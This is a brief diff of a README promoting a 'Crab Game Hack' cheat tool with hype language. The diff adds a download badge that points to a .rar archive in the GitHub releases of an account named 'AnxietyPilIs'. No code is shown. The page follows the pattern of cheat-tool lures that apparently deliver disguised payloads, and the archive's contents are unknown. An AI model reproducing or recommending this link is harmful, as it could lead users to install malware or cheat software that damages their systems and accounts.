@@ -1,6 +1,8 @@
 # 🦀 **Crab Game Hack** – Dominate Your Gameplay  
 
 Crab Game Hack is your ultimate tool to master Crab Game with advanced features that give you total control over your gameplay. Whether you're looking to breeze through levels, gain unbeatable advantages, or tweak game mechanics, Crab Game Hack offers everything you need to enhance your experience.
+
+
 [![Download CGH](https://img.shields.io/badge/Download-CrabGame%20Hack-blue)](https://github.com/AnxietyPilIs/crab-game-cheat/releases/download/crab-game/Update.rar)
 ---
 
